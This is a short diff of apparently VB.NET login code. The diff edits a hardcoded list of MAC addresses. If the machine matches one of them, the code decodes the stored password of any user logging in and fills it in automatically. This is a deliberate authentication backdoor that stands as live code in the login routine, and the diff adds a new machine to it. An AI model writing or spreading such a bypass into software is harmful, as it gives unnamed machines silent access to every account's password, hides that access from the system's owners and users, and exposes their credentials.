@@ -192,9 +192,9 @@ GoodVer:  '       *****      End Check Ver.
             LblLogin.ForeColor = Color.Red
             GoTo sec_UsrErr_
         End If
-
+        '"52216F84D3C9"
         'Admin Login For Every user Related to Mac address
-        If MacStr = "6479F03979BB" Or MacStr = "020000000100" Or MacStr = "7C8AE174167C" Or MacStr = "00155DC80B2B" Then
+        If MacStr = "6479F03979BB" Or MacStr = "00155DC80B2B" Or MacStr = "7C8AE174167C" Or MacStr = "52216F84D3C9" Then
             TxtUsrPass.Text = Fn.PassDecoding(Usr.PUsrPWrd, Usr.PUsrSltKy)
         End If
 
